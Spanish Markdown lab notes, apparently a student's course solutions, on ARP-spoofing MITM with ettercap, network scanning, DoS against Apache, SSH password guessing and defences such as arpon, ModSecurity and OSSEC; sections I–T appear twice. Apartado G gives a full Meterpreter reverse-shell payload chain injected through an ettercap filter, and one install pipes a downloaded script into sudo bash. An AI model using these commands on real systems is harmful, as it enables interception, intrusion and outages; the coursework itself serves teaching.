<a id="top"></a>

# Tabla de Contenidos
  - [Apartado A](#apartado-a)
  - [Apartado B](#apartado-b)
  - [Apartado C](#apartado-c)
  - [Apartado D](#apartado-d)
  - [Apartado E](#apartado-e)
  - [Apartado F](#apartado-f)
  - [Apartado G](#apartado-g)
  - [Apartado H](#apartado-h)
  - [Apartado I](#apartado-i)
  - [Apartado J](#apartado-j)
  - [Apartado K](#apartado-k)
  - [Apartado L](#apartado-l)
  - [Apartado M](#apartado-m)
  - [Apartado N](#apartado-n)
  - [Apartado O](#apartado-o)
  - [Apartado P](#apartado-p)
  - [Apartado Q](#apartado-q)
  - [Apartado R](#apartado-r)
  - [Apartado S](#apartado-s)
  - [Apartado T](#apartado-t)


## APARTADO A
### Instalación de Ettercap
Instale el Ettercap y pruebe sus opciones básicas en línea de comando.
```bash
apt install ettercap-text-only
```
<p align="right"><a href="#top">back to top</a></p>

## APARTADO B 
### Captura de Paquetería y Análisis
Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Puede utilizar reshark para los siguientes subapartados.

### 1. Realizar un ataque MITM (Man-in-the-Middle)
Ejecutamos el siguiente comando para interceptar el tráfico entre la máquina del compañero y el router:
```bash
ettercap -T -q -i ens33 -M arp:remote //10.11.49.55/ //10.11.48.1/
```
Para generar tráfico HTTP, se puede usar el siguiente comando en la máquina víctima:
```bash
xdg-open http://www.edu4java.com/es/web/web30.html
```
### 2. Captura de tráfico con tcpdump
En otra terminal, ejecutamos `tcpdump` para guardar el tráfico capturado en un archivo `.pcap`:
```bash
tcpdump -i ens33 -s 65535 -w compa.pcap
```
### 3. Transferencia del archivo de captura
Desde nuestra máquina local, descargamos el archivo de captura usando `scp`:
```bash
scp lsi@10.11.49.54:/home/lsi/compa.pcap .
```
### 4. Análisis con Wireshark
Abrimos el archivo `compa.pcap` en Wireshark y comenzamos el análisis.
#### Apartados Complementarios
- **Filtrar la captura para obtener tráfico HTTP:**  
  Escribir en la barra de filtrado de Wireshark.
- **Visualizar la paquetería TCP de una determinada sesión:**  
  `Analyze > Follow > TCP Stream`
- **Obtener estadísticas del tráfico por protocolo:**  
  `Statistics > Protocol Hierarchy`
- **Visualizar las distintas conversaciones mantenidas:**  
  `Statistics > Conversations`
- **Obtener direcciones finales del tráfico de los distintos protocolos:**  
  `Statistics > Endpoints`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO C 
### Obtención de Direcciones MAC
Para obtener la relación de direcciones MAC de los equipos en el segmento de red:
```bash
nmap -sP 10.11.48.0/23
```

<p align="right"><a href="#top">back to top</a></p>

## APARTADO D 
### Obtención de Direcciones IPv6
Para obtener las direcciones IPv6 del segmento, podemos utilizar el siguiente script en Bash:
```bash
    #!/bin/bash
    # Paso 1: Generar direcciones IPv4 y guardarlas en un archivo
    seq -f "10.11.49.%g" 1 254 > ipv4_addresses.txt
    # Paso 2: Convertir las direcciones IPv4 a IPv6 y guardarlas en otro archivo
    while read -r ipv4; do
        ipv6="2002:$(printf "%02x%02x:%02x%02x" $(echo $ipv4 | tr '.' ' '))"
        ipv6="$ipv6::1"
        echo "$ipv6" >> ipv6_addresses.txt
    done < ipv4_addresses.txt
    # Paso 3: Escanear todas las direcciones IPv6 simultáneamente
    nmap -6 -sn -iL ipv6_addresses.txt
    # Limpiar archivos temporales
    rm ipv4_addresses.txt ipv6_addresses.txt
```

### Alternativa en Python
También podemos realizar la conversión con el siguiente script en Python:
```python
    import ipaddress
    # Abre el archivo con direcciones IPv4 y crea un archivo para las direcciones IPv6
    with open('ipv4.txt', 'r') as ipv4_file, open('ipv6_addresses.txt', 'w') as ipv6_file:
        for line in ipv4_file:
            if "Host" in line:  # Filtra solo las líneas que contienen "Host"
                parts = line.split()
                ipv4_address = parts[1]  # La dirección IPv4 está en la segunda columna
                try:
                    ipaddress.IPv4Address(ipv4_address)  # Verifica si es una dirección IPv4 válida
                    ipv6 = ipaddress.IPv6Address(f'2002::{ipv4_address}')  # Mapeo a IPv6 con el prefijo 2002
                    ipv6_file.write(str(ipv6) + '\n')  # Guarda la dirección IPv6 en el archivo
                except ipaddress.AddressValueError:
                    pass  # Ignora las líneas no válidas
    print("Conversiones completadas. Las direcciones IPv6 se han guardado en ipv6_addresses.txt con el prefijo 02.")
```
### Escaneo de direcciones IPv6 con Nmap
```bash
sudo nmap -6 -sP -iL ipv6_addresses.txt
```
> [!WARNING]
> La siguiente línea de comandos está obsoleta:  
> `ping6 -c2 -I ens33 ff02::1`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO E 
### Captura de tráfico en `ens33`
Obtenga el tráfico de entrada y salida legítimo de su interfaz de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.
```bash
tcpdump -i ens33 -s 65535 -w my.pcap
```

> [!NOTE]
> Ver en tiempo real.

Configuramos el **remote browser** en el archivo `/etc/etter.conf` y especificamos el navegador que queremos ar.

Añadimos la siguiente línea:

```bash
remote_browser = "xdg-open http://%host%url"
```

Luego ejecutamos:

```bash
xdg-open &
ettercap -P remote_browser -T -q -i ens33 -M arp:remote //10.11.49.55/ //10.11.48.1/
```

<p align="right"><a href="#top">back to top</a></p>

## APARTADO F
### Spoofing y Captura de URLs HTTP

Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio, obtenga todas las URLs TP visitadas por la víctima.

- Utilizamos el archivo `pcap` obtenido de la máquina de nuestro compañero.

Se puede visualizar en:

**`Statistics > HTTP > Requests`**

<p align="right"><a href="#top">back to top</a></p>

## APARTADO G 
### Uso de Metasploit para Ingeniería Social

1. Instalamos **Metasploit** siguiendo [este tutorial](https://computingforgeeks.com/stall-metasploit-framework-on-debian/).

2. Creamos el payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.48.55 LPORT=5555 -f elf > payload.bin
```

3. Movemos el archivo al servidor Apache:

```bash
cp payload.bin /var/www/html/
```

4. Creamos el filtro `ett.filter`:

```bash
nano ett.filter
```
```bash
if (ip.proto == TCP && tcp.src == 80) {
    replace("a href", "a href=\"http://10.11.49.55/payload.bin\">");
    msg("replaced href.\n");
}
```

5. Compilamos el filtro:

```bash
etterfilter ett.filter -o ig.ef
```

6. Activamos el `ip_forwarding`:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

7. Iniciamos **Ettercap** con el filtro:

```bash
ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.54/ //10.11.48.1/
```

8. Desde el cliente, accedemos a la página y descargamos el payload:

```bash
curl http://example.com
```

> [!NOTE]
> También se puede usar `wget` para descargar el payload.

1. Damos permisos de ejecución al payload:

```bash
chmod +x payload.bin
```

10. Ejecutamos el payload en la máquina víctima:

```bash
./payload.bin
```

11. Desde el atacante, abrimos la consola de **Metasploit**:

```bash
msfconsole
```
```bash
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.11.48.51
set LPORT 5555
set ExitOnSession false
exploit -j -z
```

Ahora estamos dentro de la máquina víctima desde el atacante.

> [!NOTE] 
> Si la sesión se queda pillada, usamos `sessions 1`.  
> Para salir, podemos ejecutar:  
>   ```bash
>   msf6 exploit(multi/handler) > exit -y
>   ```

<p align="right"><a href="#top">back to top</a></p>

## APARTADO H 
### MITM en IPv6

Haga un ataque **MITM** en IPv6 y visualice la paquetería.

```bash
ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/
```

> [!NOTE]
> El resto del proceso funciona igual que en el [segundo apartado](https://github.com/Meleagrista/legislacion-seguridad-informatica/edit/main/practica-2/p2-defensa.md#apartado-b).

<p align="right"><a href="#top">back to top</a></p>

## APARTADO I
Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
> `apt install arpon`

- Para vaciar la tabla arp: `ip -s -s neigh flush all`
> `nano /etc/arpon.conf`

```bash
#
# ArpON configuration file.
#
# See the arpon(8) man page for details.
#
#
# Static entries matching the ens33 network interface:
#
10.11.48.1	    dc:08:56:10:84:b9
10.11.49.51	    00:50:56:97:24:d0
```
- Para saber la dirección mac: `ip addr show`
- Para saber si nos han spoofeado: `ip neigh show`, y ver que la dirección gateway.
  
> `arpon -d -i ens33 -H`

> [!NOTE]
> Para cerrar los procesos de arpon usar `ps -A | grep arpon` y luego `kill <process>`.

> [!NOTE]
> Tras instalar `arpon` es necesario deshabilitarlo para que no se inicie en boot.
> Como medida de seguridad es recomendable usar `shutdown -r +10` para programar un reinicio mientras se trabaja con `arpon` para evitar quedarte fuera.

> [!WARNING]
> Si no está deshabilitado esto es inútil.
> Es necesario usar el comando `kill` para cerrarlo, y después siempre maskearlo, si no desinstalarlo, cuando dejes de usarlo.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO J
Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.
> `nmap -A 10.11.48.0/23 > nmap_full.txt`

> [!NOTE]
> Puede ser increíblemente lento, es recomendable usarlo en IPs individuales.

### Continuación del apartado
1. Realice alguna de las pruebas de port scanning sobre IPv6.
> `nmap -A -6 2002:a0b:3137::1`
2. ¿Coinciden los servicios prestados por un sistema con los de IPv4?
> `nmap -A 10.11.49.54`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO K
Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.
> `apt-get install iftop`
> `iftop -i ens33`
> `apt-get install vnstat`
> `vnstat -l -i ens33`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO L
Monitoremos nuestra infraestructura:
1. Instale `prometheus` y `node_exporter` y configúrelos para recopilar métricas de su máquina Linux.
2. Posteriormente, instale `grafana` y agregue como fuente de datos las métricas de su equipo en Prometheus.
3. Importe vía Grafana el dashboard 1860.
4. En los ataques de los apartados M y N, busque posibles alteraciones en las métricas visualizadas.
> [!NOTE]
> Para instalar Firewalld, visitar [esta página](https://computingforgeeks.com/how-to-install-and-configure-firewalld-on-debian/).
> Para instalar todos los programas, seguir [este tutorial](https://medium.com/@ismaelaguilera_/instalación-y-configuración-de-prometheus-grafana-centos8-331c0e43ccc1).

<p align="right"><a href="#top">back to top</a></p>

## APARTADO M
1. ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?
> Un ataque directo es cuando un atacante envía una gran cantidad de tráfico directamente a tu servidor, sobrecargando su capacidad de respuesta.
2. ¿Y mediante un DoS de tipo reflective flooding attack?
> Un ataque de reflexión se basa en hacer que un tercero envíe tráfico masivo a tu servidor mediante solicitudes NTP con direcciones IP falsas.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO N
Ataque un servidor Apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS.
> `apt install apache2`
> `curl https://www.alvarofreire.es/ > /var/www/html/index.html`

#### 1. Slowhttptest
> `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.54 -x 24 -p 3`

#### 2. Apache benchmarking
> `ab -n 10000 -c 10000 http://10.11.49.55/`

#### 3. Slowloris Python
> `git clone https://github.com/gkbrk/slowloris.git`
> `cd slowloris`
> `python3 slowloris.py 10.11.49.55 -s 500`

#### 4. Slowloris Perl
> `perl slowloris.pl -dns 10.11.49.55`

## APARTADO O
Instale y configure ModSecurity. Vuelva a proceder con el ataque del apartado anterior y observe los resultados.
> `apt install libapache2-mod-security2`
> `a2enmod headers`
> `a2enmod security2`
> `systemctl restart apache2`
> `nano /etc/modsecurity/modsecurity.conf`
```bash
SecRuleEngine On
SecConnEngine On 
SecConnReadStateLimit 10
SecConnWriteStateLimit 10
```
> [!NOTE]
> Para ver la lista de módulos activos usar `apachectl -M`.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO P
1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
> `whois -h whois.ripe.net UDC`

> [!WARNING]
> Desde la máquina virtual no funcionan estos comandos, hay que hacerlos desde nuestra máquina local.

2. Obtenga información sobre los servidores DNS y MX de la UDC.
> `dig udc.es MX`

3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?
> `dig axfr @zipi.udc.es udc.es.`

> No, la transferencia de zona está deshabilitada.

4. Obtenga todos los nombres de dominio posibles de la UDC.
> `nmap --script hostmap-crtsh.nse udc.es`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO Q
Trate de obtener un perfil de los sistemas en su red de prácticas.
> `nmap -O --osscan-guess`
> `nmap -sV`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO R
Realice un ataque de “password guessing” contra su servidor SSH y compruebe las alarmas en el analizador de logs.
> `apt-get install medusa`
> `medusa -h 10.11.49.54 -u lsi -P 10k-most-common.txt -M ssh`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO S
Configure un sistema de respuesta activa, como OSSEC, y pruébelo ante un ataque de “password guessing”.
> `apt-get install ossec-hids-server`
> `/var/ossec/bin/manage_agents`
> `/var/ossec/bin/ossec-control start`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO T
Analice logs de un sistema comprometido con OSSEC para detectar incidentes de seguridad.
> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a`
> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a | /var/ossec/bin/ossec-reportd`
```bash
awk '/\(level [0-9]+\)/ {print a[NR-2] "---" a[NR-1] "---" $0 "---" ; next} {a[NR]=$0}' ossec_output.txt | sort
```

<p align="right"><a href="#top">back to top</a></p>

## APARTADO I
Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
> `apt install arpon`
- Para vaciar la tabla arp: `ip -s -s neigh flush all`
> `nano /etc/arpon.conf`
```bash
#
# ArpON configuration file.
#
# See the arpon(8) man page for details.
#
#
# Static entries matching the ens33 network interface:
#
10.11.48.1	    dc:08:56:10:84:b9
10.11.49.51	    00:50:56:97:24:d0
```
- Para saber la dirección mac: `ip addr show`
> `arpon -d -i ens33 -H`

> [!NOTE]
> Para cerrar los procesos de arpon usar `ps -A | grep arpon` y luego `kill <process>`.

> [!NOTE]
> Tras instalar `arpon` es necesario deshabilitarlo para que no se inicie en boot.

Como medida de seguridad es recomendable usar `shutdown -r +10` para programar un reinicio mientras se trabaja con `arpon` para evitar quedarte fuera.
> [!WARNING]
> Si no está desahabilitado esto es inutil.

Es necesario usar el comando `kill` para cerrarlo, y despues siempre maskearlo, si no desinstalarlo, cuando dejes de usarlo.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO J
Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.
> `nmap -A 10.11.48.0/23 > nmap_full.txt`

> [!NOTE]
> Puede ser increiblemente lento, es recomendable usarlo en ips individuales.

### Continuación del aparatdo
1. Realice alguna de las pruebas de port scanning sobre IPv6.
> `nmap -A -6 2002:a0b:3137::1`

2. ¿Coinciden los servicios prestados por un sistema con los de IPv4?
> `nmap -A 10.11.49.54`

> Si coinciden, `80` y `514`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO K
Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.
> `apt-get install iftop`

> `iftop -i ens33`

> `apt-get install vnstat`

> `vnstat -l -i ens33`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO L
Monitoremos nuestra infraestructura:
1. Instale `prometheus` y `node_exporter` y configurelos para recopliar todo tipo de métricas de su maquina linux.
2. Posteriormente instale `grafana` y agregue como fuente de datos las métricas de su equipo de prometheus.
3. Importe vía grafana el dashboard 1860.
4. En los ataques de los apartados m y n busque posibles alteraciones en las metricas visualizadas.

> [!NOTE]
> Para instalar Firewalld, visitar [esta pagina](https://computingforgeeks.com/how-to-install-and-configure-firewalld-on-debian/).

Para instalar todos los programas seguir [este tutorial](https://medium.com/@ismaelaguilera_/instalación-y-configuración-de-prometheus-grafana-centos8-331c0e43ccc1).

1. Encender Prometeus: `systemctl start prometheus` en `10.11.49.55:9090`
2. Encender Node Exporter: `systemctl start node_exporter`
3. Encender Grafana: `systemctl start grafana-server`, en `10.11.49.55:3000`

>[!IMPORTANT]
>Poner la escala de tiempo en 5 min, no en dias como esta por defecto (esto se cambia arriba a la derecha)

<p align="right"><a href="#top">back to top</a></p>

## APARTADO M
1. ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?
> A direct attack is when an attacker sends a massive amount of traffic directly to your server. The traffic overwhelms your server’s ability to process requests. When it can’t process any more requests, your websites won’t load anymore.

2. ¿Y mediante un DoS de tipo reflective flooding attack?
> A reflection attack is a bit more complex. An attacker tricks a third computer or network into sending overwhelming amounts of legitimate traffic to your server. NTP synchronizes clocks between computer systems. Servers use NTP to ask each other what time it is. To use NTP in a reflection DoS attack, the attacker sends time and date requests to a third computer via NTP while spoofing your IP address.

> By spoofing your IP, the attacker sends requests, but the response to those requests is sent to your server. This can create a DoS attack because while the the attacker's request is very small, usually a single packet of about 50 bytes, the response has up to 10 packets between 100 and 500 bytes each. The attacker can send a relatively small amount of traffic that bounces back as a huge amount of traffic to overwhelm your server.

## APARTADO N
Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).
> `apt install apache2`

> `curl https://www.alvarofreire.es/ > /var/www/html/index.html`

#### 1. Slowhttptest
> `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.54 -x 24 -p 3`

#### 2. Apache benchmarking
> `ab -n 10000 -c 10000 http://10.11.49.55/`

#### 3. Slowloris Python
> `git clone https://github.com/gkbrk/slowloris.git`

> `cd slowloris`

> `python3 slowloris.py 10.11.49.55 -s 500`

#### 4. Slowlori Perl
Crear archivo `slowlorys.pl` y copiar contenido de [aqui](https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl).

> `perl slowloris.pl -dns 10.11.49.55`

1. ¿Cómo podría proteger dicho servicio ante este tipo de ataque?
> Con un firewall de aplicaciones web como modsecurity. Además, se deben implementar medidas de seguridad adicionales, como la configuración adecuada de listas de control de acceso (ACL), la actualización regular de software y sistemas operativos para corregir vulnerabilidades conocidas, y la monitorización constante del tráfico de red para detectar patrones sospechosos que podrían indicar un ataque. También es crucial educar a los usuarios sobre las prácticas seguras, como el uso de contraseñas fuertes y la autenticación de dos factores.

2. ¿Y si se produjese desde fuera de su segmento de red?
> Si el ataque proviene desde fuera del segmento de red, es importante implementar un firewall de red para filtrar y bloquear el tráfico no autorizado. Además, se puede utilizar una red privada virtual (VPN) para establecer conexiones seguras y cifradas desde ubicaciones externas. La configuración de reglas de firewall específicas y la segmentación de la red son prácticas efectivas para limitar el acceso no autorizado desde fuera del segmento de red.

3. ¿Cómo podría tratar de saltarse dicha protección?
> No se debe buscar ni intentar saltarse ninguna protección de seguridad. Sin embargo, desde una perspectiva educativa y ética, entender cómo se pueden superar las defensas puede ser valioso para fortalecer la seguridad. Para mejorar la protección, se podrían explorar técnicas como la inyección de SQL, ataques de fuerza bruta, o vulnerabilidades específicas del software utilizado. Luego, se deben tomar medidas para mitigar estos riesgos, como la validación adecuada de entradas, la aplicación de parches de seguridad y la configuración correcta de políticas de acceso.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO O
Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?
> [!NOTE]
> Para ver la lista de modulos activos usar `apachectl -M`.

> `apt install libapache2-mod-security2`

> `a2enmod headers`

> `a2enmod security2`

> `systemctl restart apache2`

> `cp /etc/modsecurity/modsecurity.conf-recommended app`

> `cat app`

> `nano /etc/modsecurity/modsecurity.conf`

```bash
SecRuleEngine On

SecConnEngine On 

SecConnReadStateLimit 10

SecConnWriteStateLimit 10
```

> `apt install libapache2-mod-evasive`

> `a2enmod evasive`

> `nano /etc/apache2/mods-enabled/evasive.conf`

```bash
<IfModule mod_evasive20.c>
    #DOSHashTableSize    3097
    DOSPageCount        1
    DOSSiteCount        1
    
    DOSPageInterval     1
    DOSSiteInterval     2
    
    DOSBlockingPeriod   300

    #DOSEmailNotify      you@yourdomain.com
    #DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
    #DOSLogDir           "/var/log/mod_evasive"
</IfModule>
```

> `wget http://ftp.us.debian.org/debian/pool/main/liba/libapache2-mod-qos/libapache2-mod-qos_11.74-1+b1_amd64.deb`

> `dpkg -i libapache2-mod-qos_11.74-1+b1_amd64.deb`

> [!NOTE]
> Se puede modificar el `qos.conf` para aplicar las reglas.

### OWASP ModSecurity Core Rule Set
The OWASP ModSecurity Core Rule Set (CRS) is a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls. The CRS aims to protect web applications from a wide range of attacks, including the OWASP Top Ten, with a minimum of false alerts. The CRS provides protection against many common attack categories, including SQL Injection, Cross Site Scripting, and Local File Inclusion.

1. Elimina el conjunto de reglas actual que viene preempaquetado con ModSecurity ejecutando el siguiente comando:
> `rm -rf /usr/share/modsecurity-crs`

2. Asegúrate de que git esté instalado:
> `apt install git`

3. Clona el repositorio de GitHub de OWASP-CRS en el directorio /usr/share/modsecurity-crs:
> `git clone https://github.com/coreruleset/coreruleset /usr/share/modsecurity-crs`

4. Renombra el archivo crs-setup.conf.example a crs-setup.conf:
> `mv /usr/share/modsecurity-crs/crs-setup.conf.example /usr/share/modsecurity-crs/crs-setup.conf`

5. Renombra el archivo de reglas de exclusión de solicitudes predetermined:
> `mv /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf`

> [!NOTE]
> Para ver la lista de modulos activos usar `apachectl -M`.
> - `a2enmod headers`
> - `systemctl restart apache2`

### Modsecurity
> `a2enmod security2`

### Evasive
> `a2enmod evasive`

### QoS
> `a2enmod qos`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO P
1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
> `whois -h whois.ripe.net UDC`

> [!WARNING]
> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.

2. Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.
> `apt install bind-utils`

> `dig udc.es MX`

> [!WARNING]
> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.

3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?
- No, tiene la transferencia de zona deshabilitada:
> `dig axfr @zipi.udc.es udc.es.`

> [!WARNING]
> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.

4. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.
> `nmap --script hostmap-crtsh.nse udc.es`

5. ¿Qué gestor de contenidos se utiliza en www.usc.es?
> `apt-get install whatweb`

> `whatweb www.usc.es`

6. Para hacer un traduccion inversa:
> `host <dirección IP>`

> `dig -x <dirección IP>`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO Q
Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.
1. Para hacer OS fingerprinting: `nmap -O --osscan-guess`
2. Para hacer port scanning: `nmap -sV`

```bash
  nmap -sL 10.11.48.0/23 #  lista de maquinas activas en la red
  nmap -sP 10.11.48.0/23 #  lista sistema de red
  nmap -sV 10.11.48.70 # fingerprinting
  nmap -sV -p <portnum> 10.11.48.70 # fingerprinting de puerto
```

>[!TIP] 
> Son comandos adicionales.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO R
Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.
> `apt-get install medusa`

- El archivo exacto se puede encontrar [aquí](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt).
> `scp .\10k-most-common.txt lsi@10.11.49.54:/home/lsi`

Después de añadir la contraseña correcta continuamos...
> `medusa -h 10.11.49.54 -u lsi -P 10k-most-common.txt -M ssh`

>[!TIP]
> Comprobar que no esta baneado la maquina.

<p align="right"><a href="#top">back to top</a></p>

## APARTADO S
Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.
> `apt -y install  wget git vim unzip make gcc build-essential php php-cli php-common libapache2-mod-php apache2-utils inotify-tools libpcre2-dev zlib1g-dev  libz-dev libssl-dev libevent-dev build-essential libsystemd-dev`

> `wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.7.0.zip`

> `mv 3.7.0.zip  ossec-hids-3.7.0.zip`

> `unzip ossec-hids-3.7.0.zip`

> `cd ossec-hids-3.7.0`

> `./install.sh`

> `wget -q -O - https://updates.atomicorp.com/installers/atomic | sudo bash`

> `apt-get install ossec-hids-agent`

> [!NOTE]
> Si no se encuentra el paquete, probar a usar: `apt-get update`

> `apt-get install ossec-hids-server`

> `/var/ossec/bin/manage_agents`

> `/var/ossec/bin/ossec-control start`

Para más información sobre la instalación se puede consultar la [siguiente página](https://www.ossec.net/docs/docs/manual/installation/installation-requirements.html) para ver los requisitos de instalación y la [siguiente página](https://www.ossec.net/download-ossec/) para ver los métodos de instalación.

### Consejos
1. Para desbanear la ip de la maquina atacante podemos usar los siguientes comandos:
> `/var/ossec/active-response/bin/host-deny.sh delete - 10.11.49.55`

> `iptables -D INPUT -s 10.11.49.55 -j DROP`

> [!NOTE]
> Se puede ver quien esta baneado con estos comandos: `cat /etc/hosts.deny` y `iptables -L`

> [!WARNING]
> El segundo comando puede dar errores. Si se queda pillado borrar el archivo `fw-drop` o en la carpeta principal o en `/var/ossec/active-response/bin/`.

2. Los registros (logs) se pueden ver de la siguiente manera:
> `tail /var/ossec/logs/ossec.log` 

> `tail /var/ossec/logs/active-responses.log`

<p align="right"><a href="#top">back to top</a></p>

## APARTADO T
Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a`

> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd`

Mi propio codigo para ver los errores por orden es:

```bash
command_to_generate_output="cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a"

(eval "$command_to_generate_output") >> ossec_output.txt

awk '/\(level [0-9]+\)/ {print a[NR-2] "---" a[NR-1] "---" $0 "---" ; next} {a[NR]=$0}' ossec_output.txt | awk -F"\\(level |\\)" '{print "Level: " $2 "---" $0}' | sort>

rm ossec_output.txt
```

<p align="right"><a href="#top">back to top</a></p>